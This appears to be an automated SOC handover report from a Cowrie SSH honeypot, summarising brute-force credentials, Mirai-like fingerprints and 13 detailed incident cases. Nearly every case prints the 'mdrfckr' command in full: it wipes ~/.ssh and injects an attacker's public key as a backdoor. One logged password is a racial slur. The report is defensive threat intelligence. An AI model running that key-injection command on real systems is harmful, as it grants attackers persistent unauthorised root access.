# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-24 |
| **Generated At** | 2026-05-24T09:59:24Z |
| **Shift Time** | 09:59 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **101** |
| Confirmed Threats | **81** |
| False Positives Filtered | **20** (19.8%) |
| Unique Attacker IPs | **25** |
| Countries of Origin | **14** |
| High Severity Cases | **14** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **87** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **41** |
| Unique Credential Pairs | **29** |
| Unique Usernames | **22** |
| Unique Passwords | **29** |
| Successful Auth Pairs | **9** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 14 |
| `345gs5662d34` | 7 |
| `kwang` | 1 |
| `testuser` | 1 |
| `developer` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 7 |
| `3245gs5662d34` | 7 |
| `kwang` | 1 |
| `testpassword` | 1 |
| `12345` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 7 |
| `root` | `3245gs5662d34` | 7 |
| `kwang` | `kwang` | 1 |
| `testuser` | `testpassword` | 1 |
| `developer` | `12345` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `456852` | `40.83.182.122` | 2026-05-24T09:31:35 |
| `root` | `3245gs5662d34` | `40.83.182.122` | 2026-05-24T09:31:41 |
| `root` | `Lj123456` | `197.243.0.62` | 2026-05-24T09:33:13 |
| `root` | `3245gs5662d34` | `197.243.0.62` | 2026-05-24T09:33:19 |
| `root` | `Azerty2025` | `197.243.0.62` | 2026-05-24T09:37:21 |
| `root` | `nigger123` | `197.243.0.62` | 2026-05-24T09:41:39 |
| `root` | `Test1234567890!` | `40.83.182.122` | 2026-05-24T09:43:11 |
| `root` | `abc@2025` | `197.243.0.62` | 2026-05-24T09:50:15 |
| `root` | `Qq1234567` | `197.243.0.62` | 2026-05-24T09:54:38 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **101** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 40 |
| Unknown | 3 |
| Go SSH scanner | 2 |
| OpenSSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 39 | 3 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |
| `bc9e7273cde2...` | Mirai/variant | 1 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |
| `af8223ac9914...` | libssh-based | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 39 | 3 | Mirai/variant |
| `95420f9d932d...` | Unknown | 3 | 2 | — |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `bc9e7273cde2...` | OpenSSH | 1 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `af8223ac9914...` | libssh | 1 | 1 | libssh-based |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `40.83.182.122`, `197.243.0.62`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **25** |
| Unique ASNs | **21** |
| High-Risk ASNs | **11** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS28573` | Claro NXT Telecomunicacoes Ltda | 2 | LOW |
| `AS25369` | Hydra Communications Ltd | 2 | HIGH |
| `AS398324` | Censys, Inc. | 1 | HIGH |
| `AS9299` | Philippine Long Distance Telephone Company | 1 | LOW |
| `AS14593` | Space Exploration Technologies Corporation | 1 | LOW |
| `AS9790` | Two Degrees Networks Limited | 1 | LOW |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (14)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-08d5dad17622

| Field | Detail |
|---|---|
| **Source IP** | `40.83.182[.]122` |
| **First Seen** | 2026-05-24 09:31 |
| **Last Seen** | 2026-05-24 09:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 09:31:34` | `cowrie.session.connect` |
| `2026-05-24 09:31:34` | `cowrie.client.version` |
| `2026-05-24 09:31:34` | `cowrie.client.kex` |
| `2026-05-24 09:31:35` | `cowrie.login.success` |
| `2026-05-24 09:31:36` | `cowrie.session.params` |
| `2026-05-24 09:31:36` | `cowrie.command.input` |
| `2026-05-24 09:31:36` | `cowrie.command.failed` |
| `2026-05-24 09:31:36` | `cowrie.log.closed` |
| `2026-05-24 09:31:36` | `cowrie.session.params` |
| `2026-05-24 09:31:36` | `cowrie.command.input` |
| `2026-05-24 09:31:37` | `cowrie.session.file_download` |
| `2026-05-24 09:31:37` | `cowrie.log.closed` |
| `2026-05-24 09:31:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.83.182[.]122` to AbuseIPDB if not already reported
- [ ] Block `40.83.182[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7fc253bd3c3

| Field | Detail |
|---|---|
| **Source IP** | `40.83.182[.]122` |
| **First Seen** | 2026-05-24 09:31 |
| **Last Seen** | 2026-05-24 09:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 09:31:40` | `cowrie.session.connect` |
| `2026-05-24 09:31:40` | `cowrie.client.version` |
| `2026-05-24 09:31:40` | `cowrie.client.kex` |
| `2026-05-24 09:31:41` | `cowrie.login.success` |
| `2026-05-24 09:31:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.83.182[.]122` to AbuseIPDB if not already reported
- [ ] Block `40.83.182[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-538a4cc4afd3

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-05-24 09:33 |
| **Last Seen** | 2026-05-24 09:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 09:33:12` | `cowrie.session.connect` |
| `2026-05-24 09:33:12` | `cowrie.client.version` |
| `2026-05-24 09:33:12` | `cowrie.client.kex` |
| `2026-05-24 09:33:13` | `cowrie.login.success` |
| `2026-05-24 09:33:14` | `cowrie.session.params` |
| `2026-05-24 09:33:14` | `cowrie.command.input` |
| `2026-05-24 09:33:14` | `cowrie.command.failed` |
| `2026-05-24 09:33:14` | `cowrie.log.closed` |
| `2026-05-24 09:33:15` | `cowrie.session.params` |
| `2026-05-24 09:33:15` | `cowrie.command.input` |
| `2026-05-24 09:33:15` | `cowrie.session.file_download` |
| `2026-05-24 09:33:15` | `cowrie.log.closed` |
| `2026-05-24 09:33:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38b24987fc85

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-05-24 09:33 |
| **Last Seen** | 2026-05-24 09:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 09:33:18` | `cowrie.session.connect` |
| `2026-05-24 09:33:18` | `cowrie.client.version` |
| `2026-05-24 09:33:18` | `cowrie.client.kex` |
| `2026-05-24 09:33:19` | `cowrie.login.success` |
| `2026-05-24 09:33:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f345c2fe99c8

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-05-24 09:37 |
| **Last Seen** | 2026-05-24 09:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 09:37:20` | `cowrie.session.connect` |
| `2026-05-24 09:37:20` | `cowrie.client.version` |
| `2026-05-24 09:37:20` | `cowrie.client.kex` |
| `2026-05-24 09:37:21` | `cowrie.login.success` |
| `2026-05-24 09:37:21` | `cowrie.session.params` |
| `2026-05-24 09:37:21` | `cowrie.command.input` |
| `2026-05-24 09:37:21` | `cowrie.command.failed` |
| `2026-05-24 09:37:22` | `cowrie.log.closed` |
| `2026-05-24 09:37:22` | `cowrie.session.params` |
| `2026-05-24 09:37:22` | `cowrie.command.input` |
| `2026-05-24 09:37:22` | `cowrie.session.file_download` |
| `2026-05-24 09:37:22` | `cowrie.log.closed` |
| `2026-05-24 09:37:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc851cd772b2

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-05-24 09:37 |
| **Last Seen** | 2026-05-24 09:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 09:37:25` | `cowrie.session.connect` |
| `2026-05-24 09:37:25` | `cowrie.client.version` |
| `2026-05-24 09:37:25` | `cowrie.client.kex` |
| `2026-05-24 09:37:26` | `cowrie.login.success` |
| `2026-05-24 09:37:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92e4cdd7782a

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-05-24 09:41 |
| **Last Seen** | 2026-05-24 09:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 09:41:38` | `cowrie.session.connect` |
| `2026-05-24 09:41:38` | `cowrie.client.version` |
| `2026-05-24 09:41:38` | `cowrie.client.kex` |
| `2026-05-24 09:41:39` | `cowrie.login.success` |
| `2026-05-24 09:41:39` | `cowrie.session.params` |
| `2026-05-24 09:41:39` | `cowrie.command.input` |
| `2026-05-24 09:41:39` | `cowrie.command.failed` |
| `2026-05-24 09:41:40` | `cowrie.log.closed` |
| `2026-05-24 09:41:40` | `cowrie.session.params` |
| `2026-05-24 09:41:40` | `cowrie.command.input` |
| `2026-05-24 09:41:40` | `cowrie.session.file_download` |
| `2026-05-24 09:41:40` | `cowrie.log.closed` |
| `2026-05-24 09:41:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bead6f08a0c

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-05-24 09:41 |
| **Last Seen** | 2026-05-24 09:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 09:41:43` | `cowrie.session.connect` |
| `2026-05-24 09:41:43` | `cowrie.client.version` |
| `2026-05-24 09:41:43` | `cowrie.client.kex` |
| `2026-05-24 09:41:44` | `cowrie.login.success` |
| `2026-05-24 09:41:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de2a54354705

| Field | Detail |
|---|---|
| **Source IP** | `40.83.182[.]122` |
| **First Seen** | 2026-05-24 09:43 |
| **Last Seen** | 2026-05-24 09:43 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 09:43:10` | `cowrie.session.connect` |
| `2026-05-24 09:43:10` | `cowrie.client.version` |
| `2026-05-24 09:43:10` | `cowrie.client.kex` |
| `2026-05-24 09:43:11` | `cowrie.login.success` |
| `2026-05-24 09:43:12` | `cowrie.session.params` |
| `2026-05-24 09:43:12` | `cowrie.command.input` |
| `2026-05-24 09:43:12` | `cowrie.command.failed` |
| `2026-05-24 09:43:12` | `cowrie.log.closed` |
| `2026-05-24 09:43:12` | `cowrie.session.params` |
| `2026-05-24 09:43:12` | `cowrie.command.input` |
| `2026-05-24 09:43:13` | `cowrie.session.file_download` |
| `2026-05-24 09:43:13` | `cowrie.log.closed` |
| `2026-05-24 09:43:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.83.182[.]122` to AbuseIPDB if not already reported
- [ ] Block `40.83.182[.]122` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f1a486eb999

| Field | Detail |
|---|---|
| **Source IP** | `40.83.182[.]122` |
| **First Seen** | 2026-05-24 09:43 |
| **Last Seen** | 2026-05-24 09:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 09:43:16` | `cowrie.session.connect` |
| `2026-05-24 09:43:16` | `cowrie.client.version` |
| `2026-05-24 09:43:16` | `cowrie.client.kex` |
| `2026-05-24 09:43:17` | `cowrie.login.success` |
| `2026-05-24 09:43:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.83.182[.]122` to AbuseIPDB if not already reported
- [ ] Block `40.83.182[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-755c9d74c1f9

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-05-24 09:50 |
| **Last Seen** | 2026-05-24 09:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 09:50:13` | `cowrie.session.connect` |
| `2026-05-24 09:50:13` | `cowrie.client.version` |
| `2026-05-24 09:50:14` | `cowrie.client.kex` |
| `2026-05-24 09:50:15` | `cowrie.login.success` |
| `2026-05-24 09:50:15` | `cowrie.session.params` |
| `2026-05-24 09:50:15` | `cowrie.command.input` |
| `2026-05-24 09:50:15` | `cowrie.command.failed` |
| `2026-05-24 09:50:16` | `cowrie.log.closed` |
| `2026-05-24 09:50:16` | `cowrie.session.params` |
| `2026-05-24 09:50:16` | `cowrie.command.input` |
| `2026-05-24 09:50:16` | `cowrie.session.file_download` |
| `2026-05-24 09:50:16` | `cowrie.log.closed` |
| `2026-05-24 09:50:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-427a72c11920

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-05-24 09:50 |
| **Last Seen** | 2026-05-24 09:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 09:50:19` | `cowrie.session.connect` |
| `2026-05-24 09:50:19` | `cowrie.client.version` |
| `2026-05-24 09:50:19` | `cowrie.client.kex` |
| `2026-05-24 09:50:20` | `cowrie.login.success` |
| `2026-05-24 09:50:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54823171e17c

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-05-24 09:54 |
| **Last Seen** | 2026-05-24 09:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 09:54:37` | `cowrie.session.connect` |
| `2026-05-24 09:54:37` | `cowrie.client.version` |
| `2026-05-24 09:54:37` | `cowrie.client.kex` |
| `2026-05-24 09:54:38` | `cowrie.login.success` |
| `2026-05-24 09:54:38` | `cowrie.session.params` |
| `2026-05-24 09:54:38` | `cowrie.command.input` |
| `2026-05-24 09:54:38` | `cowrie.command.failed` |
| `2026-05-24 09:54:39` | `cowrie.log.closed` |
| `2026-05-24 09:54:39` | `cowrie.session.params` |
| `2026-05-24 09:54:39` | `cowrie.command.input` |
| `2026-05-24 09:54:40` | `cowrie.session.file_download` |
| `2026-05-24 09:54:40` | `cowrie.log.closed` |
| `2026-05-24 09:54:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

